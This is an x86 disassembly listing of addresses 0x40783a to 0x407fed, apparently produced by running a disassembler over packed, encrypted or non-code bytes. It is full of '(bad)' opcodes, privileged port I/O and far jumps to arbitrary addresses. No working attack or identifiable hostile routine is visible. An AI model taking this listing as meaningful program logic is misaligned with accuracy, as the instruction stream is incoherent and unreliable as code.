  40783a:	sub    esp,edx
  40783c:	imul   ebx,DWORD PTR [ecx],0x666d6390
  407842:	ret    
  407843:	push   ecx
  407844:	push   edi
  407845:	clc    
  407846:	mov    WORD PTR [ebp-0x7518e519],ds
  40784c:	pop    ecx
  40784d:	sub    BYTE PTR [edi],al
  40784f:	sub    bl,BYTE PTR [eax-0x1dfab092]
  407855:	mov    fs,WORD PTR ss:[eax]
  407858:	pop    ebp
  407859:	daa    
  40785a:	pushf  
  40785b:	cwde   
  40785c:	push   ecx
  40785d:	in     eax,0xee
  40785f:	test   DWORD PTR [ecx],ebx
  407861:	repz (bad) 
  407863:	popf   
  407864:	jb     0x407834
  407866:	lahf   
  407867:	push   ebp
  407868:	mov    esi,0x473c1a24
  40786d:	push   edx
  40786e:	loop   0x40786c
  407870:	jge    0x407864
  407872:	inc    ebx
  407873:	loop   0x4078e9
  407875:	mov    dl,0x1a
  407877:	call   0x6478af8e
  40787c:	cmc    
  40787d:	xor    DWORD PTR [ebx-0x71],esp
  407880:	adc    DWORD PTR [ebx+0x449d751f],0xffffff8f
  407887:	(bad)  
  407888:	into   
  407889:	mov    DWORD PTR [eax],edx
  40788b:	pop    ebp
  40788c:	loope  0x4078b8
  40788e:	jp     0x407854
  407890:	out    0xc7,eax
  407892:	mov    ah,0x1c
  407894:	jno    0x4078c0
  407896:	ret    0x5b6b
  407899:	mov    bl,0xfe
  40789b:	mov    edx,0xb755c4c0
  4078a0:	cmp    BYTE PTR [edi],bl
  4078a2:	jo     0x40783a
  4078a4:	cmc    
  4078a5:	cdq    
  4078a6:	neg    BYTE PTR [ebx]
  4078a8:	dec    ebx
  4078aa:	adc    bh,dl
  4078ac:	aaa    
  4078ad:	mov    esp,0xdc5e8883
  4078b2:	mov    ch,0x4d
  4078b4:	scas   eax,DWORD PTR es:[edi]
  4078b5:	out    dx,al
  4078b6:	pop    ebp
  4078b7:	jmp    0x2fce:0x9acaf26
  4078be:	dec    esp
  4078bf:	adc    al,0x95
  4078c1:	jae    0x407906
  4078c3:	test   edx,edi
  4078c5:	mov    ds:0xaafd27a0,al
  4078ca:	pusha  
  4078cb:	into   
  4078cc:	je     0x4078d1
  4078ce:	shl    dh,1
  4078d0:	mov    al,ds:0x155eb1d5
  4078d5:	cmp    al,0x73
  4078d7:	push   ss
  4078d8:	and    DWORD PTR [ecx-0x36],0x1d
  4078dc:	mov    ds:0x4e35994c,al
  4078e1:	mov    ecx,0xae5c912b
  4078e6:	sbb    al,0x74
  4078e8:	rcl    DWORD PTR [edi],0x4d
  4078eb:	cmp    DWORD PTR [ebp-0x6e],0x15
  4078ef:	inc    BYTE PTR [eax]
  4078f1:	out    0xb2,eax
  4078f3:	mov    dh,0xa9
  4078f5:	ins    BYTE PTR es:[edi],dx
  4078f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078f7:	cmp    esp,esp
  4078f9:	std    
  4078fa:	push   0x3f249ff1
  4078ff:	lods   eax,DWORD PTR ds:[esi]
  407900:	cmp    BYTE PTR [esp+eiz*2-0x28a9471c],al
  407907:	jle    0x4078c3
  407909:	fdivr  QWORD PTR ss:[ebp+eax*4+0x65f49698]
  407911:	sar    ch,cl
  407913:	mov    bl,0xf7
  407915:	sbb    ah,BYTE PTR ds:0xa43b266e
  40791b:	push   edi
  40791c:	inc    eax
  40791d:	repnz xor eax,0xf193ad92
  407923:	call   0xf949:0x621ffd77
  40792a:	push   ebp
  40792b:	scas   eax,DWORD PTR es:[edi]
  40792c:	push   cs
  40792d:	sbb    esi,ebx
  40792f:	call   0x1be4:0x78db9e72
  407936:	ficomp WORD PTR [esi-0x2e4de94d]
  40793c:	aas    
  40793d:	sub    al,0x72
  40793f:	ds nop
  407941:	mov    edi,DWORD PTR [ebx-0x36]
  407944:	dec    ebp
  407945:	adc    ebp,DWORD PTR [ebp-0xfb9c02f]
  40794b:	mov    dl,0xf9
  40794d:	cmc    
  40794e:	pop    ss
  40794f:	pop    esi
  407950:	jb     0x407912
  407952:	adc    al,0x75
  407954:	xor    esp,DWORD PTR [ebx+ebx*1+0x20462c76]
  40795b:	sbb    esi,ebx
  40795d:	imul   edx,DWORD PTR [edx+esi*2],0x9b429d2f
  407964:	jge    0x407903
  407966:	dec    edx
  407967:	and    edi,DWORD PTR [ebx-0x4c0afdaa]
  40796d:	or     al,0xe3
  40796f:	jbe    0x4079bc
  407971:	inc    ebp
  407972:	fisubr WORD PTR [eax-0x788e34f9]
  407978:	or     eax,DWORD PTR [edx+0x7c2741d0]
  40797e:	stos   DWORD PTR es:[edi],eax
  40797f:	cmp    al,0x19
  407981:	nop
  407982:	ficomp DWORD PTR [ecx-0x254a2a67]
  407988:	clc    
  407989:	add    ch,ah
  40798b:	(bad)  
  40798c:	jp     0x40795d
  40798e:	mov    ds:0x6bfbe4c0,al
  407993:	rol    edi,0x58
  407996:	into   
  407997:	push   0x78f24f35
  40799c:	or     ebx,0xe
  40799f:	dec    esp
  4079a0:	aad    0x28
  4079a2:	jnp    0x407984
  4079a4:	sub    eax,0xc96e5405
  4079a9:	outs   dx,BYTE PTR ds:[esi]
  4079aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079ab:	rcr    BYTE PTR [ebp-0x76588f13],0x46
  4079b2:	stc    
  4079b3:	out    0x3e,al
  4079b5:	dec    ecx
  4079b6:	in     eax,dx
  4079b7:	or     al,0x64
  4079b9:	ins    BYTE PTR es:[edi],dx
  4079ba:	mov    esi,0xcf3a2eb4
  4079bf:	and    edi,ebx
  4079c1:	mov    ecx,0xf7f39d7b
  4079c6:	nop
  4079c7:	sub    cl,bl
  4079c9:	shl    DWORD PTR [eax],0x22
  4079cc:	leave  
  4079cd:	sub    ah,BYTE PTR [edi-0x5c0db21c]
  4079d3:	jo     0x40797b
  4079d5:	add    al,0x45
  4079d7:	adc    ebx,DWORD PTR [edx-0x73]
  4079da:	jg     0x407a55
  4079dc:	mov    WORD PTR [edx],gs
  4079de:	sahf   
  4079df:	mov    DWORD PTR [ecx+0x36],esi
  4079e2:	ret    
  4079e3:	icebp  
  4079e4:	jbe    0x407a2a
  4079e6:	or     DWORD PTR [eax-0xc465746],ecx
  4079ec:	sbb    BYTE PTR [ecx-0x57],ah
  4079ef:	fist   WORD PTR [ebp-0x873e18d]
  4079f5:	jecxz  0x4079c5
  4079f7:	retf   
  4079f8:	mov    cl,0x41
  4079fa:	ss dec eax
  4079fc:	push   ecx
  4079fd:	test   cl,al
  4079ff:	xchg   esi,eax
  407a00:	mov    cl,0xe2
  407a03:	repnz loopne 0x407a4e
  407a06:	adc    BYTE PTR [edi-0x80],al
  407a09:	shl    BYTE PTR [ebp+0x71],1
  407a0c:	mov    esi,0xe4539b61
  407a11:	xchg   ebx,eax
  407a12:	xchg   ecx,eax
  407a13:	mov    dh,0xe6
  407a15:	shl    esi,1
  407a17:	jle    0x4079c1
  407a19:	add    esi,DWORD PTR [eax-0x19]
  407a1c:	std    
  407a1d:	push   esp
  407a1e:	xor    BYTE PTR [ebx+0x17],ch
  407a21:	jo     0x4079ea
  407a23:	mov    DWORD PTR [ebp+0x48],esp
  407a26:	jb     0x4079be
  407a28:	jecxz  0x4079c3
  407a2a:	mov    ds:0x8d91482b,al
  407a2f:	sub    DWORD PTR [esi-0x80],ebp
  407a32:	in     al,dx
  407a33:	sub    al,0xc2
  407a35:	add    DWORD PTR [ebp+eax*4-0x6ac20ce1],esp
  407a3c:	lods   al,BYTE PTR ds:[esi]
  407a3d:	xchg   edx,eax
  407a3e:	mov    ah,0x38
  407a40:	xchg   esi,eax
  407a41:	mov    ?,WORD PTR [ebx-0x487e5e50]
  407a47:	xchg   esi,eax
  407a48:	fcmovne st,st(2)
  407a4a:	pop    ds
  407a4b:	nop
  407a4c:	mov    cl,0xec
  407a4e:	and    eax,0x3a2e41e0
  407a53:	xchg   edx,eax
  407a54:	jmp    0x407aab
  407a56:	add    eax,0xd3119362
  407a5b:	rol    BYTE PTR [eax+ebx*4],cl
  407a5e:	ja     0x9d5031d9
  407a64:	call   0xadbde8cc
  407a69:	lods   al,BYTE PTR ds:[esi]
  407a6a:	jmp    0x1f7:0x29c93c8d
  407a71:	mov    edi,0x4ee834b7
  407a76:	xor    al,0xc9
  407a78:	or     dl,dl
  407a7a:	out    0x57,eax
  407a7c:	adc    eax,0xc5df1252
  407a81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a82:	pop    edi
  407a83:	mov    ebx,esp
  407a85:	mov    ds:0x8380932c,eax
  407a8a:	repnz sbb esp,DWORD PTR [ecx]
  407a8d:	sub    DWORD PTR [esi-0x70a9c428],0xa5fc54d0
  407a97:	popf   
  407a98:	sub    dl,dl
  407a9a:	xlat   BYTE PTR ds:[ebx]
  407a9b:	adc    DWORD PTR [ecx-0x3c],0x4f
  407a9f:	inc    ebp
  407aa0:	iret   
  407aa1:	xchg   esi,eax
  407aa2:	cmp    DWORD PTR [ebx-0x7e],esp
  407aa5:	addr16 loop 0x407b24
  407aa8:	in     al,dx
  407aa9:	jl     0x407adb
  407aab:	add    DWORD PTR [esi+eax*1-0x58],0xb0e72b27
  407ab3:	mov    ecx,0x1243c398
  407ab8:	shl    DWORD PTR [edx+esi*2],1
  407abb:	out    dx,al
  407abc:	sbb    dl,BYTE PTR [esi-0x76]
  407abf:	in     eax,0x1c
  407ac1:	cmp    DWORD PTR [edi+eax*8],edi
  407ac4:	or     al,0x5c
  407ac6:	sub    al,0x9d
  407ac8:	sbb    eax,0xb114171c
  407acd:	cwde   
  407ace:	add    DWORD PTR [edx-0x79645baf],edi
  407ad4:	pop    edx
  407ad5:	xor    ebp,DWORD PTR es:[esi+eiz*4+0xd3ef0cd]
  407add:	shl    dl,0x32
  407ae0:	sar    BYTE PTR [eax+0x35],0xb4
  407ae4:	sahf   
  407ae5:	mov    al,0x55
  407ae7:	ret    0x48cd
  407aea:	leave  
  407aeb:	add    BYTE PTR [ebx+0x7341a570],0xbc
  407af2:	scas   eax,DWORD PTR es:[edi]
  407af3:	push   0xffffffd6
  407af5:	cmp    dh,BYTE PTR [esi]
  407af7:	ret    
  407af8:	add    ecx,DWORD PTR [ebx]
  407afa:	fsubr  st(7),st
  407afc:	inc    edi
  407afd:	repnz shl DWORD PTR [eax+eax*2-0x233d971b],0x8
  407b06:	cld    
  407b07:	out    dx,eax
  407b08:	inc    ebp
  407b09:	daa    
  407b0a:	bound  ecx,QWORD PTR [edx-0x471d3d2]
  407b10:	loopne 0x407b6f
  407b12:	pusha  
  407b13:	loop   0x407b24
  407b15:	jne    0x407aaf
  407b17:	mov    esi,gs
  407b19:	es bnd jmp 0x58e1bbcf
  407b20:	enter  0xb915,0x51
  407b24:	or     BYTE PTR [eax],0x20
  407b27:	mov    dl,0x37
  407b29:	or     al,0x99
  407b2b:	mov    edx,0x5a46afc3
  407b30:	pop    eax
  407b31:	out    0xc,al
  407b33:	pusha  
  407b34:	popa   
  407b35:	xchg   ebp,eax
  407b36:	fsub   st(2),st
  407b38:	cld    
  407b39:	push   ss
  407b3a:	mov    DWORD PTR [ecx],ebx
  407b3c:	test   al,0x34
  407b3e:	add    eax,0x6a15a155
  407b43:	adc    al,0x3d
  407b45:	mov    dl,0x34
  407b47:	leave  
  407b48:	das    
  407b49:	mov    DWORD PTR [eax-0x31a79671],esp
  407b4f:	mov    bl,BYTE PTR [edi]
  407b51:	outs   dx,BYTE PTR ds:[esi]
  407b52:	ja     0x407aed
  407b54:	inc    edi
  407b55:	jnp    0x407bb2
  407b57:	cmc    
  407b58:	dec    ecx
  407b59:	jge    0x407bb9
  407b5b:	sub    ebx,DWORD PTR [edx-0x2b641910]
  407b61:	cwde   
  407b62:	pminub mm3,QWORD PTR [esi]
  407b65:	mov    ds:0x1efea44b,eax
  407b6a:	iret   
  407b6b:	aad    0x43
  407b6d:	and    ah,BYTE PTR [esp+eiz*4]
  407b70:	(bad)  
  407b71:	dec    ecx
  407b72:	sbb    al,BYTE PTR [eax+0x13f1e0c0]
  407b78:	stc    
  407b79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b7a:	push   0xffffffc3
  407b7c:	cmc    
  407b7d:	outs   dx,DWORD PTR ds:[esi]
  407b7e:	push   esp
  407b7f:	or     DWORD PTR [edx+0x5a],edi
  407b82:	loope  0x407bd8
  407b84:	in     eax,dx
  407b85:	pop    esi
  407b86:	push   0x9e1ca856
  407b8b:	inc    ebx
  407b8c:	jge    0x407ba9
  407b8e:	loopne 0x407b16
  407b90:	mov    esi,eax
  407b92:	ss mov ch,0xbc
  407b95:	jmp    0xd0d8353e
  407b9a:	fiadd  DWORD PTR [esi]
  407b9c:	stos   DWORD PTR es:[edi],eax
  407b9d:	dec    ebp
  407b9e:	pop    ebp
  407b9f:	jmp    DWORD PTR [eax+ebx*8+0x18]
  407ba3:	push   ss
  407ba4:	sti    
  407ba5:	cmp    dh,dl
  407ba7:	fnstenv [ebx-0x29]
  407baa:	sbb    al,ch
  407bac:	or     BYTE PTR [eax+0xb],ch
  407baf:	fiadd  WORD PTR [edx+0x7c3c7e5b]
  407bb5:	or     esi,edi
  407bb7:	and    dh,BYTE PTR [ecx+0x5fc90f9a]
  407bbd:	dec    esi
  407bbe:	je     0x407b46
  407bc0:	push   edi
  407bc1:	out    0x73,al
  407bc3:	mov    dl,ah
  407bc5:	push   edx
  407bc6:	adc    DWORD PTR [esi],edi
  407bc8:	sub    eax,0x2f3794e0
  407bcd:	sub    DWORD PTR [edx+0x7fccac85],ebp
  407bd3:	sbb    dh,BYTE PTR [ebx+0x2]
  407bd6:	fbstp  TBYTE PTR [esi-0x335d8358]
  407bdd:	jo     0x407bbd
  407bdf:	mov    al,0x4
  407be1:	mov    es:0x60990239,eax
  407be7:	or     eax,0xe5391d8b
  407bec:	cli    
  407bed:	aas    
  407bee:	xor    eax,0x68b6563f
  407bf3:	add    DWORD PTR [ecx],ecx
  407bf5:	out    dx,eax
  407bf6:	push   0x1d0aa0c7
  407bfb:	mov    ch,BYTE PTR [edx-0x29]
  407bfe:	add    ch,BYTE PTR [ebp-0x2f3f1dd8]
  407c04:	jmp    0x407bc7
  407c06:	mov    fs,WORD PTR [ecx]
  407c08:	addr16 or al,0x83
  407c0b:	loope  0x407c70
  407c0d:	lods   eax,DWORD PTR ds:[esi]
  407c0e:	arpl   WORD PTR [ecx+0x1ce8663e],di
  407c14:	dec    esp
  407c15:	test   al,cl
  407c17:	gs pop eax
  407c19:	or     BYTE PTR [ebp+edi*1+0x101f3fbe],dl
  407c20:	xchg   esi,eax
  407c21:	inc    eax
  407c22:	imul   eax,DWORD PTR [esi],0x6e35d177
  407c28:	xchg   ebp,eax
  407c29:	push   edx
  407c2a:	cmc    
  407c2b:	test   DWORD PTR [ecx+ebp*4],0x28e23830
  407c32:	bound  eax,QWORD PTR [ebp-0x7e]
  407c35:	je     0x407bd1
  407c37:	scas   eax,DWORD PTR es:[edi]
  407c38:	add    eax,0x70b6f7ad
  407c3d:	lods   al,BYTE PTR ds:[esi]
  407c3e:	icebp  
  407c3f:	mov    edi,0x40efc881
  407c44:	xlat   BYTE PTR ds:[ebx]
  407c45:	stos   DWORD PTR es:[edi],eax
  407c46:	retf   0x45be
  407c49:	hlt    
  407c4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c4c:	fsubr  DWORD PTR [edx]
  407c4e:	std    
  407c4f:	sbb    esp,DWORD PTR [esi+0x25]
  407c52:	ds push 0x7f
  407c55:	std    
  407c56:	maxps  xmm0,xmm2
  407c59:	pushf  
  407c5a:	stc    
  407c5b:	adc    BYTE PTR [edx+edi*2-0x2383a2c5],bh
  407c62:	jg     0x407c35
  407c64:	cmp    eax,0xa0b3340b
  407c69:	dec    edi
  407c6a:	push   ebp
  407c6b:	push   es
  407c6c:	in     al,dx
  407c6d:	jg     0x407c24
  407c6f:	je     0x407c2d
  407c71:	push   0x3d
  407c73:	fiadd  DWORD PTR [ebp+0x5f]
  407c76:	push   edx
  407c77:	xchg   ebx,eax
  407c78:	lods   eax,DWORD PTR ds:[esi]
  407c79:	ins    DWORD PTR es:[edi],dx
  407c7a:	jecxz  0x407c9c
  407c7c:	xchg   edx,eax
  407c7d:	sbb    edi,edx
  407c7f:	adc    esi,esp
  407c81:	cmp    dl,BYTE PTR [edi+0x16]
  407c84:	xchg   edx,eax
  407c85:	ja     0x407c20
  407c87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c88:	xlat   BYTE PTR ds:[ebx]
  407c89:	xor    BYTE PTR [eax-0x5fc6d7dd],bh
  407c8f:	xchg   ecx,eax
  407c90:	jno    0x407c69
  407c92:	adc    al,0x88
  407c94:	fsubr  QWORD PTR ds:[ecx]
  407c97:	dec    BYTE PTR [esi]
  407c99:	loop   0x407ce7
  407c9b:	xor    esp,DWORD PTR [ebx]
  407c9d:	int    0x78
  407c9f:	retf   
  407ca0:	xchg   ah,ch
  407ca2:	aaa    
  407ca3:	sbb    DWORD PTR [edx-0x6faa5453],0xe621eedd
  407cad:	dec    edi
  407cae:	jp     0x407d00
  407cb0:	sbb    dh,BYTE PTR [edi-0x3]
  407cb3:	cmc    
  407cb4:	repz xor eax,ebx
  407cb7:	xor    DWORD PTR [esi],esi
  407cb9:	loop   0x407cc2
  407cbb:	mov    al,ds:0x6e7d94c6
  407cc0:	mov    DWORD PTR [esi+eax*1-0x36],esi
  407cc4:	(bad)  
  407cc5:	sbb    al,0xd6
  407cc7:	loop   0x407c50
  407cc9:	mov    esi,0x7a1d8240
  407cce:	mov    ch,0x3f
  407cd0:	xor    dh,BYTE PTR [ecx-0x747eb8cf]
  407cd6:	mov    ds:0x6c2e378c,eax
  407cdb:	retf   
  407cdc:	inc    ebp
  407cdd:	into   
  407cde:	aaa    
  407cdf:	pop    ebx
  407ce0:	pusha  
  407ce1:	mov    edi,0x785fcabc
  407ce6:	retf   0x25fc
  407ce9:	ret    
  407cea:	test   DWORD PTR [ebx+0x6],ecx
  407ced:	mov    esi,0x2def82fe
  407cf2:	mov    dh,0x84
  407cf4:	pop    DWORD PTR [edx+0x9916b1c]
  407cfa:	pop    ecx
  407cfb:	jmp    DWORD PTR [eax+ebx*1-0x65]
  407cff:	popa   
  407d00:	xchg   ecx,eax
  407d01:	sti    
  407d02:	shl    BYTE PTR [esi+0x228e998e],cl
  407d08:	xor    al,0x92
  407d0a:	call   0x7b9c2362
  407d0f:	stos   DWORD PTR es:[edi],eax
  407d10:	std    
  407d11:	and    BYTE PTR [eax-0x3e51deb9],0x96
  407d18:	sbb    DWORD PTR [eax],eax
  407d1a:	fstp   DWORD PTR [ecx-0x1e]
  407d1d:	mov    bl,0x90
  407d1f:	jmp    0x407d26
  407d21:	adc    ch,bh
  407d23:	jecxz  0x407ca7
  407d25:	arpl   dx,sp
  407d27:	push   ecx
  407d28:	push   ebp
  407d29:	loopne 0x407cd1
  407d2b:	mov    ebx,DWORD PTR [ecx-0x43295220]
  407d31:	mov    ah,0xb
  407d33:	outs   dx,BYTE PTR ds:[esi]
  407d34:	or     ebx,ebp
  407d36:	dec    esi
  407d37:	xchg   edi,eax
  407d38:	ins    DWORD PTR es:[edi],dx
  407d39:	sub    BYTE PTR [ebp+0x4],ch
  407d3c:	mov    ebx,0xf8de64c0
  407d41:	loopne 0x407d5f
  407d43:	jb     0x407d2f
  407d45:	in     al,0xb4
  407d47:	inc    esp
  407d48:	xchg   edx,eax
  407d49:	gs and ecx,edx
  407d4c:	xor    eax,0xdf6b785c
  407d51:	stos   DWORD PTR es:[edi],eax
  407d52:	(bad)  
  407d54:	push   ebp
  407d55:	and    BYTE PTR [ebx-0x19ff1120],ch
  407d5b:	mov    BYTE PTR [ebx-0x53],0xe2
  407d5f:	and    DWORD PTR [eax+0x269f605d],ebx
  407d65:	fistp  QWORD PTR [esi]
  407d67:	les    edi,FWORD PTR ds:0x5fd0be0f
  407d6d:	or     eax,0xcc11b9c1
  407d72:	pop    esi
  407d73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d74:	loope  0x407d63
  407d76:	leave  
  407d77:	sub    BYTE PTR [edi-0x3de10f81],cl
  407d7d:	xchg   BYTE PTR [ecx],dl
  407d7f:	mov    WORD PTR [edi-0x65],?
  407d82:	push   cs
  407d83:	adc    ebx,DWORD PTR [edx]
  407d85:	jne    0x407df1
  407d87:	loopne 0x407dd3
  407d89:	ficomp WORD PTR [ebp+0x5f]
  407d8c:	dec    ebx
  407d8d:	jb     0x407d34
  407d8f:	xchg   BYTE PTR [ebp+0x14],dh
  407d92:	ins    DWORD PTR es:[edi],dx
  407d93:	ss add BYTE PTR cs:[esi+0x19],dl
  407d98:	and    eax,0x69fe7c10
  407d9d:	call   0x1fb5:0x4e4e7aa1
  407da4:	push   ecx
  407da5:	adc    al,0xf5
  407da7:	rcl    BYTE PTR [edi+0x576b609],0x2
  407dae:	ins    BYTE PTR es:[edi],dx
  407daf:	rcr    DWORD PTR [edi],1
  407db1:	test   eax,0x6f436b7a
  407db6:	hlt    
  407db7:	ja     0x407d58
  407db9:	enter  0xcb99,0x82
  407dbd:	test   DWORD PTR [ecx-0x28],ebx
  407dc0:	mov    esp,0x2ea35bb0
  407dc5:	or     BYTE PTR [edx+0x2c],bh
  407dc8:	mov    edx,0x6f46df82
  407dcd:	mov    dl,0x6
  407dcf:	adc    BYTE PTR [eax],ch
  407dd1:	js     0x407d56
  407dd3:	repz shl DWORD PTR [ebp+0x63],1
  407dd7:	retf   0x51e8
  407dda:	std    
  407ddb:	in     al,0x38
  407ddd:	inc    eax
  407dde:	(bad)  
  407ddf:	mov    ebp,0x301b8089
  407de4:	addr16 retf 0x73ad
  407de8:	cwde   
  407de9:	fmul   DWORD PTR [ecx]
  407deb:	loope  0x407da2
  407ded:	pop    ds
  407dee:	fld    TBYTE PTR [esi]
  407df1:	adc    BYTE PTR [ecx],dh
  407df3:	push   ebp
  407df4:	cmp    DWORD PTR [edi+0x35f3d0c8],esi
  407dfa:	sahf   
  407dfb:	jae    0x407e39
  407dfd:	lahf   
  407dfe:	mov    edi,0x3888882
  407e03:	aad    0xe8
  407e05:	rcr    DWORD PTR [ecx+0x543991fa],cl
  407e0b:	aad    0x1e
  407e0d:	sub    eax,0x38ebbfb0
  407e12:	imul   ebp,esi,0xa8ac1fe4
  407e18:	scas   al,BYTE PTR es:[edi]
  407e19:	daa    
  407e1a:	fmul   QWORD PTR [ebp+0x20]
  407e1d:	stos   DWORD PTR es:[edi],eax
  407e1e:	adc    ecx,DWORD PTR [eax]
  407e20:	inc    esi
  407e21:	dec    edi
  407e22:	out    dx,al
  407e23:	loope  0x407e77
  407e25:	mov    ebx,0xa93428c8
  407e2a:	inc    edi
  407e2b:	test   al,0x7c
  407e2d:	test   eax,0xccee8813
  407e32:	cdq    
  407e33:	pop    ebx
  407e34:	jnp    0x407e60
  407e36:	mov    DWORD PTR ds:[eax],ecx
  407e39:	xchg   esi,eax
  407e3a:	xchg   DWORD PTR [esp+esi*1-0x4],eax
  407e3e:	repz in al,dx
  407e40:	out    0x25,al
  407e42:	out    dx,eax
  407e43:	jo     0x407e0e
  407e45:	std    
  407e46:	aas    
  407e47:	pop    edi
  407e48:	cmp    eax,0x54393dc1
  407e4d:	dec    edx
  407e4e:	and    esp,DWORD PTR [ecx-0x23]
  407e51:	mov    esp,0x4de3a58a
  407e56:	jno    0x407eab
  407e58:	call   0x4f70adcf
  407e5d:	imul   ecx,ecx,0x999105a5
  407e63:	mov    al,ds:0x5d2d7185
  407e68:	xor    eax,0xff545a9b
  407e6d:	inc    esi
  407e6e:	sub    eax,0xd685c7c2
  407e73:	stos   DWORD PTR es:[edi],eax
  407e74:	inc    ebx
  407e75:	cmp    eax,0xd3a5942e
  407e7a:	cs mov dl,0xac
  407e7d:	and    esp,DWORD PTR [esi]
  407e7f:	jl     0x407e0a
  407e81:	push   cs
  407e82:	ss push edi
  407e84:	dec    esi
  407e85:	lahf   
  407e86:	mov    WORD PTR [ebx-0x260d2d61],fs
  407e8c:	mov    ch,0x7b
  407e8e:	retf   0xbb7e
  407e91:	inc    edx
  407e92:	pop    ecx
  407e93:	test   bh,0xd3
  407e96:	frstor [edx]
  407e98:	aaa    
  407e99:	cs jns 0x407e20
  407e9c:	mov    esi,0xddf16295
  407ea1:	into   
  407ea2:	mov    dl,0x46
  407ea4:	arpl   WORD PTR [ecx+0x7807fe99],ax
  407eaa:	pop    ebp
  407eab:	xchg   edx,eax
  407eac:	lods   eax,DWORD PTR ds:[esi]
  407ead:	stc    
  407eae:	or     DWORD PTR [esi+0x3c5bca65],edx
  407eb4:	push   cs
  407eb5:	push   es
  407eb6:	xchg   ebx,eax
  407eb7:	(bad)  
  407eb8:	xlat   BYTE PTR ds:[ebx]
  407eb9:	add    DWORD PTR [ebx+0x3c],esi
  407ebc:	push   ds
  407ebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ebe:	sub    bl,BYTE PTR [ebp+0x2f]
  407ec1:	gs mov cl,0x9e
  407ec4:	jl     0x407e49
  407ec6:	outs   dx,DWORD PTR ds:[si]
  407ec8:	test   esi,0x5c9bedc3
  407ece:	sub    dl,BYTE PTR [eax]
  407ed0:	fs push es
  407ed2:	jns    0x407e97
  407ed4:	sbb    bl,dh
  407ed6:	repnz mov al,ds:0x232f096a
  407edc:	scas   eax,DWORD PTR es:[edi]
  407edd:	rcl    BYTE PTR [edi+0xc],1
  407ee0:	das    
  407ee1:	test   DWORD PTR [edi],eax
  407ee3:	aad    0xa7
  407ee5:	and    edx,DWORD PTR [bp+di+0x57]
  407ee9:	push   ebx
  407eea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407eeb:	mov    bh,0x74
  407eed:	call   0x52467660
  407ef2:	mov    edi,0x280f72f9
  407ef7:	inc    edx
  407ef8:	mov    cl,0x85
  407efa:	and    al,0xff
  407efc:	lea    edx,[ebp+0x6e]
  407eff:	int3   
  407f00:	pop    ds
  407f01:	cmc    
  407f02:	push   ss
  407f03:	inc    edx
  407f04:	call   0x8c79fb68
  407f09:	inc    esp
  407f0a:	les    edi,FWORD PTR [esi+0x4759acd8]
  407f10:	xchg   edi,eax
  407f11:	and    al,0x96
  407f13:	adc    BYTE PTR [ebx],cl
  407f15:	out    dx,eax
  407f16:	push   0x68
  407f18:	cmc    
  407f19:	mov    bl,0xf5
  407f1b:	and    DWORD PTR [eax+ecx*2],eax
  407f1e:	jp     0x407ed7
  407f20:	xor    al,0x2
  407f22:	or     al,0x80
  407f24:	mov    eax,0xce169abf
  407f29:	test   BYTE PTR [edx+0x45],ch
  407f2c:	mov    eax,ds:0xbf95f38f
  407f31:	jmp    0x4efce99b
  407f36:	arpl   WORD PTR [edx+ebp*4-0x4b],sp
  407f3a:	and    eax,0xc2e9f87d
  407f3f:	mov    ch,0x4a
  407f41:	mov    bh,0xc1
  407f43:	jmp    0xe370b5de
  407f48:	cli    
  407f49:	lods   eax,DWORD PTR ds:[esi]
  407f4a:	mov    es,WORD PTR [edi-0x25ac3e54]
  407f50:	in     eax,dx
  407f51:	pop    ds
  407f52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f53:	pop    ss
  407f54:	mov    ch,0x4f
  407f56:	stos   BYTE PTR es:[edi],al
  407f57:	mov    cl,BYTE PTR [ebx+0x26e7c3c8]
  407f5d:	fstp   TBYTE PTR [edi-0x2c]
  407f60:	into   
  407f61:	imul   esp,esi,0xffffffa7
  407f64:	or     esi,edi
  407f66:	pop    ss
  407f67:	imul   edx,ebp,0xaddc6eb
  407f6d:	repz pop ss
  407f6f:	jmp    0x29ac:0xba2e1cfb
  407f76:	ret    
  407f77:	loopne 0x407f11
  407f79:	mov    ds:0x2cd474ba,al
  407f7e:	adc    BYTE PTR [edi-0x1af2d7da],cl
  407f84:	cmp    DWORD PTR [esi-0x37],ebp
  407f87:	xlat   BYTE PTR ds:[ebx]
  407f88:	ins    DWORD PTR es:[edi],dx
  407f89:	jg     0x407f18
  407f8b:	or     al,0xde
  407f8d:	push   edx
  407f8e:	aam    0xc9
  407f90:	cli    
  407f91:	dec    edi
  407f92:	mov    ebp,0x1803677f
  407f97:	imul   edx,DWORD PTR [edx],0xa14f78cb
  407f9d:	repz xor al,0x5e
  407fa0:	mov    cl,0x94
  407fa2:	sbb    edx,eax
  407fa4:	std    
  407fa5:	(bad)  
  407fa6:	sahf   
  407fa7:	sub    esp,ebp
  407fa9:	ficom  WORD PTR [edi]
  407fab:	shl    DWORD PTR [edx],1
  407fad:	dec    ecx
  407fae:	cmp    eax,ecx
  407fb0:	stc    
  407fb1:	jnp    0x407fc5
  407fb3:	pusha  
  407fb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fb5:	xor    dl,BYTE PTR [ebp+0x47e12ac6]
  407fbb:	mov    ecx,0x9ffbd77e
  407fc0:	push   ebx
  407fc1:	shr    DWORD PTR [esi+0x67f979c5],0xab
  407fc8:	cmovo  ebp,DWORD PTR [edx+0x78]
  407fcc:	outs   dx,DWORD PTR ds:[esi]
  407fcd:	mov    al,dl
  407fcf:	push   eax
  407fd0:	lods   al,BYTE PTR ds:[esi]
  407fd1:	je     0x407f91
  407fd3:	cmp    ecx,esp
  407fd5:	ss pop ds
  407fd7:	sbb    cl,BYTE PTR [edi+0x610243a9]
  407fdd:	dec    ebp
  407fde:	xor    al,0x96
  407fe0:	test   DWORD PTR [edx+0x6948eb7c],eax
  407fe6:	xchg   esp,eax
  407fe7:	cmp    DWORD PTR [edx-0x20],esp
  407fea:	xchg   esi,eax
  407feb:	inc    esi
  407fed:	lds    edi,FWORD PTR [edi]
